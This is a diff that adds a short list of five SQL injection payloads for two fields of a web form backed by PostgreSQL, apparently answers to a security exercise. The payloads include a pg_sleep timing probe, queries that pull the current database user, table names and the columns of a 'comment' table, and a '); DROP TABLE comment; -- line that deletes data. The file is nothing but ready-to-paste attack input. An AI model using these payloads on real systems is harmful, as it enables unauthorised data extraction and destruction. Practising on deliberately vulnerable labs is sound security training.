@@ -1,0 +1,10 @@
+1- in second field: '); SELECT pg_sleep(2); --
+
+2- in first filed: ',(SELECT current_user));--
+
+3- in first field:  ',(SELECT table_name   FROM information_schema.tables  WHERE table_schema='public' AND table_type='BASE TABLE'));--
+
+4- in first field: ',(SELECT STRING_AGG(COLUMN_NAME,',') FROM     information_schema.COLUMNS WHERE TABLE_NAME = 'comment'));--
+
+5- in second field:  '); DROP TABLE comment; --
+
